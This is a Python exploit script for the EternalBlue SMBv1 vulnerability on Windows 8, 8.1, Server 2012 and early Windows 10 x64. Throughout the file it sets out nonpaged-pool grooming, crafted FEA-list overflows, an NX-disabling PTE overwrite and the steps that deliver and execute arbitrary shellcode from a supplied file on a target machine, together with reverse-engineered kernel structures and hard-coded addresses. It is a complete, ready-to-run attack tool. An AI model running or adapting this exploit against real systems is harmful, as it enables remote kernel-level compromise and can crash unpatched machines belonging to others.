#!/usr/bin/python
from impacket import smb, ntlm
from struct import pack
import sys
import socket

'''
EternalBlue exploit for Windows 8 and 2012 by sleepya
The exploit might FAIL and CRASH a target system (depended on what is overwritten)
The exploit support only x64 target

Tested on:
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 10 Pro Build 10240 x64


Default Windows 8 and later installation without additional service info:
- anonymous is not allowed to access any share (including IPC$)
  - More info: https://support.microsoft.com/en-us/help/3034016/ipc-share-and-null-session-behavior-in-windows
- tcp port 445 is filtered by firewall


Reference:
- http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
- "Bypassing Windows 10 kernel ASLR (remote) by Stefan Le Berre" https://drive.google.com/file/d/0B3P18M-shbwrNWZTa181ZWRCclk/edit


Exploit info:
- If you do not know how exploit for Windows 7/2008 work. Please read my exploit for Windows 7/2008 at
    https://gist.github.com/worawit/bd04bad3cd231474763b873df081c09a because the trick for exploit is almost the same
- The exploit use heap of HAL for placing fake struct (address 0xffffffffffd00e00) and shellcode (address 0xffffffffffd01000).
    On Windows 8 and Wndows 2012, the NX bit is set on this memory page. Need to disable it before controlling RIP.
- The exploit is likely to crash a target when it failed
- The overflow is happened on nonpaged pool so we need to massage target nonpaged pool.
- If exploit failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
- See the code and comment for exploit detail.


Disable NX method:
- The idea is from "Bypassing Windows 10 kernel ASLR (remote) by Stefan Le Berre" (see link in reference)
- The exploit is also the same but we need to trigger bug twice
- First trigger, set MDL.MappedSystemVa to target pte address
  - Write '\x00' to disable the NX flag
- Second trigger, do the same as Windows 7 exploit
- From my test, if exploit disable NX successfully, I always get code execution
'''

# if anonymous can access any share folder, 'IPC$' is always accessible.
# authenticated user is always able to access 'IPC$'.
# Windows 2012 does not allow anonymous to login if no share is accessible.
USERNAME=''
PASSWORD=''

# because the srvnet buffer is changed dramatically from Windows 7, I have to choose NTFEA size to 0x9000
NTFEA_SIZE = 0x9000

ntfea9000 = (pack('<BBH', 0, 0, 0) + '\x00')*0x260  # with these fea, ntfea size is 0x1c80
ntfea9000 += pack('<BBH', 0, 0, 0x735c) + '\x00'*0x735d  # 0x8fe8 - 0x1c80 - 0xc = 0x735c
ntfea9000 += pack('<BBH', 0, 0, 0x8147) + '\x00'*0x8148  # overflow to SRVNET_BUFFER_HDR

'''
Reverse from srvnet.sys (Win2012 R2 x64)
- SrvNetAllocateBufferFromPool() and SrvNetWskTransformedReceiveComplete():

// size 0x90
struct SRVNET_BUFFER_HDR {
	LIST_ENTRY list;
	USHORT flag; // 2 least significant bit MUST be clear. if 0x1 is set, pmdl pointers are access. if 0x2 is set, go to lookaside.
	char unknown0[6];
	char *pNetRawBuffer;  // MUST point to valid address (check if this request is "\xfdSMB")
	DWORD netRawBufferSize; // offset: 0x20
	DWORD ioStatusInfo;
	DWORD thisNonPagedPoolSize;  // will be 0x82e8 for netRawBufferSize 0x8100
	DWORD pad2;
	char *thisNonPagedPoolAddr; // 0x30  points to SRVNET_BUFFER
	PMDL pmdl1; // point at offset 0x90 from this struct
	DWORD nByteProcessed; // 0x40
	char unknown4[4];
	QWORD smbMsgSize; // MUST be modified to size of all recv data
	PMDL pmdl2; // 0x50:  if want to free corrupted buffer, need to set to valid address
	QWORD pSrvNetWskStruct;  // want to change to fake struct address
	DWORD unknown6; // 0x60
	char unknown7[12];
	char unknown8[0x20];
};

struct SRVNET_BUFFER {
	char transportHeader[80]; // 0x50
	char buffer[reqSize+padding];  // 0x8100 (for pool size 0x82f0), 0x10100 (for pool size 0x11000)
	SRVNET_BUFFER_HDR hdr; //some header size 0x90
	//MDL mdl1; // target
};

In Windows 8, the srvnet buffer metadata is declared after real buffer. We need to overflow through whole receive buffer.
Because transaction max data count is 66512 (0x103d0) in SMB_COM_NT_TRANSACT command and 
  DataDisplacement is USHORT in SMB_COM_TRANSACTION2_SECONDARY command, we cannot send large trailing data after FEALIST.
So the possible srvnet buffer pool size is 0x82f0. With this pool size, we need to overflow more than 0x8150 bytes.
If exploit cannot overflow to prepared SRVNET_BUFFER, the target is likely to crash because of big overflow.
'''
# Most field in overwritten (corrupted) srvnet struct can be any value because it will be left without free (memory leak) after processing
# Here is the important fields on x64
# - offset 0x18 (VOID*) : pointer to received SMB message buffer. This value MUST be valid address because there is
#                           a check in SrvNetWskTransformedReceiveComplete() if this message starts with "\xfdSMB".
# - offset 0x48 (QWORD) : the SMB message length from packet header (first 4 bytes).
#                           This value MUST be exactly same as the number of bytes we send.
#                           Normally, this value is 0x80 + len(fake_struct) + len(shellcode)
# - offset 0x58 (VOID*) : pointer to a struct contained pointer to function. the pointer to function is called when done receiving SMB request.
#                           The value MUST point to valid (might be fake) struct.
# - offset 0x90 (MDL)   : MDL for describe receiving SMB request buffer
#   - 0x90 (VOID*)    : MDL.Next should be NULL
#   - 0x98 (USHORT)   : MDL.Size should be some value that not too small
#   - 0x9a (USHORT)   : MDL.MdlFlags should be 0x1004 (MDL_NETWORK_HEADER|MDL_SOURCE_IS_NONPAGED_POOL)
#   - 0x90 (VOID*)    : MDL.Process should be NULL
#   - 0x98 (VOID*)    : MDL.MappedSystemVa MUST be a received network buffer address. Controlling this value get arbitrary write.
#                         The address for arbitrary write MUST be subtracted by a number of sent bytes (0x80 in this exploit).
#                         
#
# To free the corrupted srvnet buffer (not necessary), shellcode MUST modify some memory value to satisfy condition.
# Here is related field for freeing corrupted buffer
# - offset 0x10 (USHORT): 2 least significant bit MUST be clear. Just set to 0xfff0
# - offset 0x30 (VOID*) : MUST be fixed to correct value in shellcode. This is the value that passed to ExFreePoolWithTag()
# - offset 0x40 (DWORD) : be a number of total byte received. This field MUST be set by shellcode because SrvNetWskReceiveComplete() set it to 0
#                           before calling SrvNetCommonReceiveHandler(). This is possible because pointer to SRVNET_BUFFER struct is passed to
#                           your shellcode as function argument
# - offset 0x50 (PMDL)  : points to any fake MDL with MDL.Flags 0x20 does not set
# The last condition is your shellcode MUST return non-negative value. The easiest way to do is "xor eax,eax" before "ret".
# Here is x64 assembly code for setting nByteProcessed field
# - fetch SRVNET_BUFFER address from function argument
#     \x48\x8b\x54\x24\x40  mov rdx, [rsp+0x40]
# - fix pool pointer (rcx is -0x8150 because of fake_recv_struct below)
#     \x48\x01\xd1          add rcx, rdx
#     \x48\x89\x4a\x30      mov [rdx+0x30], rcx
# - set nByteProcessed for trigger free after return
#     \x8b\x4a\x48          mov ecx, [rdx+0x48]
#     \x89\x4a\x40          mov [rdx+0x40], ecx

# debug mode affects HAL heap. The 0xffffffffffd04000 address should be useable no matter what debug mode is.
# The 0xffffffffffd00000 address should be useable when debug mode is not enabled
# The 0xffffffffffd01000 address should be useable when debug mode is enabled
TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000  # for put fake struct and shellcode
 
# Note: feaList will be created after knowing shellcode size.

# feaList for disabling NX is possible because we just want to change only MDL.MappedSystemVa
# PTE of 0xffffffffffd00000 is at 0xfffff6ffffffe800
# NX bit is at PTE_ADDR+7
# MappedSystemVa = PTE_ADDR+7 - 0x7f
SHELLCODE_PAGE_ADDR = (TARGET_HAL_HEAP_ADDR + 0x400) & 0xfffffffffffff000
PTE_ADDR = 0xfffff6ffffffe800 + 8*((SHELLCODE_PAGE_ADDR-0xffffffffffd00000) >> 12)
fakeSrvNetBufferX64Nx = '\x00'*16
fakeSrvNetBufferX64Nx += pack('<HHIQ', 0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR)
fakeSrvNetBufferX64Nx += '\x00'*16
fakeSrvNetBufferX64Nx += '\x00'*16
fakeSrvNetBufferX64Nx += pack('<QQ', 0, 0)
fakeSrvNetBufferX64Nx += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR)  # _, _, pointer to fake struct
fakeSrvNetBufferX64Nx += pack('<QQ', 0, 0)
fakeSrvNetBufferX64Nx += '\x00'*16
fakeSrvNetBufferX64Nx += '\x00'*16
fakeSrvNetBufferX64Nx += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferX64Nx += pack('<QQ', 0, PTE_ADDR+7-0x7f)  # MDL.Process, MDL.MappedSystemVa

feaListNx = pack('<I', 0x10000)
feaListNx += ntfea9000
feaListNx += pack('<BBH', 0, 0, len(fakeSrvNetBufferX64Nx)-1) + fakeSrvNetBufferX64Nx # -1 because first '\x00' is for name
# stop copying by invalid flag (can be any value except 0 and 0x80)
feaListNx += pack('<BBH', 0x12, 0x34, 0x5678)


def createFakeSrvNetBuffer(sc_size):
	# 0x180 is size of fakeSrvNetBufferX64
	totalRecvSize = 0x80 + 0x180 + sc_size
	fakeSrvNetBufferX64 = '\x00'*16
	fakeSrvNetBufferX64 += pack('<HHIQ', 0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR)  # flag, _, _, pNetRawBuffer
	fakeSrvNetBufferX64 += pack('<QII', 0, 0x82e8, 0)  # _, thisNonPagedPoolSize, _
	fakeSrvNetBufferX64 += '\x00'*16
	fakeSrvNetBufferX64 += pack('<QQ', 0, totalRecvSize)  # offset 0x40
	fakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR, TARGET_HAL_HEAP_ADDR)  # pmdl2, pointer to fake struct
	fakeSrvNetBufferX64 += pack('<QQ', 0, 0)
	fakeSrvNetBufferX64 += '\x00'*16
	fakeSrvNetBufferX64 += '\x00'*16
	fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
	fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR-0x80)  # MDL.Process, MDL.MappedSystemVa
	return fakeSrvNetBufferX64

def createFeaList(sc_size):
	feaList = pack('<I', 0x10000)
	feaList += ntfea9000
	fakeSrvNetBuf = createFakeSrvNetBuffer(sc_size)
	feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuf)-1) + fakeSrvNetBuf # -1 because first '\x00' is for name
	# stop copying by invalid flag (can be any value except 0 and 0x80)
	feaList += pack('<BBH', 0x12, 0x34, 0x5678)
	return feaList

# fake struct for SrvNetWskTransformedReceiveComplete() and SrvNetCommonReceiveHandler()
# x64: fake struct is at ffffffff ffd00e00
#   offset 0x50:  KSPIN_LOCK
#   offset 0x58:  LIST_ENTRY must be valid address. cannot be NULL.
#   offset 0x110: array of pointer to function
#   offset 0x13c: set to 3 (DWORD) for invoking ptr to function
# some useful offset
#   offset 0x120: arg1 when invoking ptr to function
#   offset 0x128: arg2 when invoking ptr to function
#
# code path to get code exection after this struct is controlled
# SrvNetWskTransformedReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr
fake_recv_struct = ('\x00'*16)*5
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR+0x58)  # offset 0x50: KSPIN_LOCK, (LIST_ENTRY to itself)
fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR+0x58, 0)  # offset 0x60
fake_recv_struct += ('\x00'*16)*10
fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR+0x170, 0)  # offset 0x110: fn_ptr array
fake_recv_struct += pack('<QQ', (0x8150^0xffffffffffffffff)+1, 0)  # set arg1 to -0x8150
fake_recv_struct += pack('<QII', 0, 0, 3)  # offset 0x130
fake_recv_struct += ('\x00'*16)*3
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR+0x180)  # shellcode address


def getNTStatus(self):
	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)

def sendEcho(conn, tid, data):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
	transCommand['Parameters'] = smb.SMBEcho_Parameters()
	transCommand['Data'] = smb.SMBEcho_Data()

	transCommand['Parameters']['EchoCount'] = 1
	transCommand['Data']['Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('got good ECHO response')
	else:
		print('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))


# override SMB.neg_session() to allow forcing ntlm authentication
class MYSMB(smb.SMB):
	def __init__(self, remote_host, use_ntlmv2=True):
		self.__use_ntlmv2 = use_ntlmv2
		smb.SMB.__init__(self, remote_host, remote_host)

	def neg_session(self, extended_security = True, negPacket = None):
		smb.SMB.neg_session(self, extended_security=self.__use_ntlmv2, negPacket=negPacket)

def createSessionAllocNonPaged(target, size):
	conn = MYSMB(target, use_ntlmv2=False)  # with this negotiation, FLAGS2_EXTENDED_SECURITY is not set
	_, flags2 = conn.get_flags()
	# if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
	if size >= 0xffff:
		flags2 &= ~smb.SMB.FLAGS2_UNICODE
		reqSize = size // 2
	else:
		flags2 |= smb.SMB.FLAGS2_UNICODE
		reqSize = size
	conn.set_flags(flags2=flags2)
	
	pkt = smb.NewSMBPacket()

	sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
	sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()

	sessionSetup['Parameters']['MaxBufferSize']      = 61440  # can be any value greater than response size
	sessionSetup['Parameters']['MaxMpxCount']        = 2  # can by any value
	sessionSetup['Parameters']['VcNumber']           = 2  # any non-zero
	sessionSetup['Parameters']['SessionKey']         = 0
	sessionSetup['Parameters']['SecurityBlobLength'] = 0  # this is OEMPasswordLen field in another format. 0 for NULL session
	sessionSetup['Parameters']['Capabilities']       = smb.SMB.CAP_EXTENDED_SECURITY | smb.SMB.CAP_USE_NT_ERRORS

	sessionSetup['Data'] = pack('<H', reqSize) + '\x00'*20
	pkt.addCommand(sessionSetup)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('SMB1 session setup allocate nonpaged pool success')
		return conn
	
	if USERNAME:
		# Try login with valid user because anonymous user might get access denied on Windows Server 2012.
		# Note: If target allows only NTLMv2 authentication, the login will always fail.
		# support only ascii because I am lazy to implement Unicode (need pad for alignment and converting username to utf-16)
		flags2 &= ~smb.SMB.FLAGS2_UNICODE
		reqSize = size // 2
		conn.set_flags(flags2=flags2)
		
		# new SMB packet to reset flags
		pkt = smb.NewSMBPacket()
		pwd_unicode = conn.get_ntlmv1_response(ntlm.compute_nthash(PASSWORD))
		# UnicodePasswordLen field is in Reserved for extended security format.
		sessionSetup['Parameters']['Reserved'] = len(pwd_unicode)
		sessionSetup['Data'] = pack('<H', reqSize+len(pwd_unicode)+len(USERNAME)) + pwd_unicode + USERNAME + '\x00'*16
		pkt.addCommand(sessionSetup)
		
		conn.sendSMB(pkt)
		recvPkt = conn.recvSMB()
		if recvPkt.getNTStatus() == 0:
			print('SMB1 session setup allocate nonpaged pool success')
			return conn

	# lazy to check error code, just print fail message
	print('SMB1 session setup allocate nonpaged pool failed')
	sys.exit(1)


# Note: impacket-0.9.15 struct has no ParameterDisplacement
############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
        ('FID','<H=0'),
    )

def send_trans2_second(conn, tid, data, displacement):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	# assume no params

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

	transCommand['Parameters']['TotalParameterCount'] = 0
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+18
	transCommand['Data']['Pad1'] = ''

	transCommand['Parameters']['ParameterCount'] = 0
	transCommand['Parameters']['ParameterOffset'] = 0

	if len(data) > 0:
		pad2Len = (4 - fixedOffset % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = len(data)
	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
	transCommand['Parameters']['DataDisplacement'] = displacement

	transCommand['Data']['Trans_Parameters'] = ''
	transCommand['Data']['Trans_Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)


def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	command = pack('<H', setup)

	# Use SMB_COM_NT_TRANSACT because we need to send data >65535 bytes to trigger the bug.
	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
	transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
	transCommand['Parameters']['MaxSetupCount'] = 1
	transCommand['Parameters']['MaxParameterCount'] = len(param)
	transCommand['Parameters']['MaxDataCount'] = 0
	transCommand['Data'] = smb.SMBTransaction2_Data()

	transCommand['Parameters']['Setup'] = command
	transCommand['Parameters']['TotalParameterCount'] = len(param)
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+38 + len(command)
	if len(param) > 0:
		padLen = (4 - fixedOffset % 4 ) % 4
		padBytes = '\xFF' * padLen
		transCommand['Data']['Pad1'] = padBytes
	else:
		transCommand['Data']['Pad1'] = ''
		padLen = 0

	transCommand['Parameters']['ParameterCount'] = len(param)
	transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

	if len(data) > 0:
		pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = firstDataFragmentSize
	transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

	transCommand['Data']['Trans_Parameters'] = param
	transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB() # must be success
	if recvPkt.getNTStatus() == 0:
		print('got good NT Trans response')
	else:
		print('got bad NT Trans response: 0x{:x}'.format(recvPkt.getNTStatus()))
		sys.exit(1)
	
	# Then, use SMB_COM_TRANSACTION2_SECONDARY for send more data
	i = firstDataFragmentSize
	while i < len(data):
		sendSize = min(4096, len(data) - i)
		if len(data) - i <= 4096:
			if not sendLastChunk:
				break
		send_trans2_second(conn, tid, data[i:i+sendSize], i)
		i += sendSize
	
	if sendLastChunk:
		conn.recvSMB()
	return i

	
# connect to target and send a large nbss size with data 0x80 bytes
# this method is for allocating big nonpaged pool on target
def createConnectionWithBigSMBFirst80(target, for_nx=False):
	sk = socket.create_connection((target, 445))
	pkt = '\x00' + '\x00' + pack('>H', 0x8100)
	# There is no need to be SMB2 because we want the target free the corrupted buffer.
	# Also this is invalid SMB2 message.
	# I believe NSA exploit use SMB2 for hiding alert from IDS
	#pkt += '\xfeSMB' # smb2
	# it can be anything even it is invalid
	pkt += 'BAAD' # can be any
	if for_nx:
		# MUST set no delay because 1 byte MUST be sent immediately
		sk.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
		pkt += '\x00'*0x7b  # another byte will be sent later to disabling NX
	else:
		pkt += '\x00'*0x7c
	sk.send(pkt)
	return sk


def exploit(target, shellcode, numGroomConn):
	# force using smb.SMB for SMB1
	conn = smb.SMB(target, target)
	conn.login(USERNAME, PASSWORD)
	server_os = conn.get_server_os()
	print('Target OS: '+server_os)
	if server_os.startswith("Windows 10 "):
		build = int(server_os.split()[-1])
		if build >= 14393:  # version 1607
			print('This exploit does not support this target')
			sys.exit()
	elif not (server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ")):
		print('This exploit does not support this target')
		sys.exit()

	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')

	# The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.
	# Send TRANS2_OPEN2 (0) with special feaList to a target except last fragment
	progress = send_big_trans2(conn, tid, 0, feaList, '\x00'*30, len(feaList)%4096, False)

	# Another TRANS2_OPEN2 (0) with special feaList for disabling NX
	nxconn = smb.SMB(target, target)
	nxconn.login(USERNAME, PASSWORD)
	nxtid = nxconn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
	nxprogress = send_big_trans2(nxconn, nxtid, 0, feaListNx, '\x00'*30, len(feaList)%4096, False)

	# create some big buffer at server
	# this buffer MUST NOT be big enough for overflown buffer
	allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x2010)
	
	# groom nonpaged pool
	# when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
	srvnetConn = []
	for i in range(numGroomConn):
		sk = createConnectionWithBigSMBFirst80(target, for_nx=True)
		srvnetConn.append(sk)

	# create buffer size NTFEA_SIZE at server
	# this buffer will be replaced by overflown buffer
	holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE-0x10)
	# disconnect allocConn to free buffer
	# expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
	allocConn.get_socket().close()

	# hope one of srvnetConn is next to holeConn
	for i in range(5):
		sk = createConnectionWithBigSMBFirst80(target, for_nx=True)
		srvnetConn.append(sk)
	
	# remove holeConn to create hole for fea buffer
	holeConn.get_socket().close()
	
	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
	# first trigger, overwrite srvnet buffer struct for disabling NX
	send_trans2_second(nxconn, nxtid, feaListNx[nxprogress:], nxprogress)
	recvPkt = nxconn.recvSMB()
	retStatus = recvPkt.getNTStatus()
	if retStatus == 0xc000000d:
		print('good response status for nx: INVALID_PARAMETER')
	else:
		print('bad response status for nx: 0x{:08x}'.format(retStatus))
		
	# one of srvnetConn struct header should be modified
	# send '\x00' to disable nx
	for sk in srvnetConn:
		sk.send('\x00')
	
	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
	# second trigger, place fake struct and shellcode
	send_trans2_second(conn, tid, feaList[progress:], progress)
	recvPkt = conn.recvSMB()
	retStatus = recvPkt.getNTStatus()
	if retStatus == 0xc000000d:
		print('good response status: INVALID_PARAMETER')
	else:
		print('bad response status: 0x{:08x}'.format(retStatus))

	# one of srvnetConn struct header should be modified
	# a corrupted buffer will write recv data in designed memory address
	for sk in srvnetConn:
		sk.send(fake_recv_struct + shellcode)

	# execute shellcode
	for sk in srvnetConn:
		sk.close()
	
	# nicely close connection (no need for exploit)
	nxconn.disconnect_tree(tid)
	nxconn.logoff()
	nxconn.get_socket().close()
	conn.disconnect_tree(tid)
	conn.logoff()
	conn.get_socket().close()


if len(sys.argv) < 3:
	print("{} <ip> <shellcode_file> [numGroomConn]".format(sys.argv[0]))
	sys.exit(1)

TARGET=sys.argv[1]
numGroomConn = 13 if len(sys.argv) < 4 else int(sys.argv[3])

fp = open(sys.argv[2], 'rb')
sc = fp.read()
fp.close()

if len(sc) > 0xe80:
	print('Shellcode too long. The place that this exploit put a shellcode is limited to {} bytes.'.format(0xe80))
	sys.exit()

# Now, shellcode is known. create a feaList
feaList = createFeaList(len(sc))

print('shellcode size: {:d}'.format(len(sc)))
print('numGroomConn: {:d}'.format(numGroomConn))

exploit(TARGET, sc, numGroomConn)
print('done')
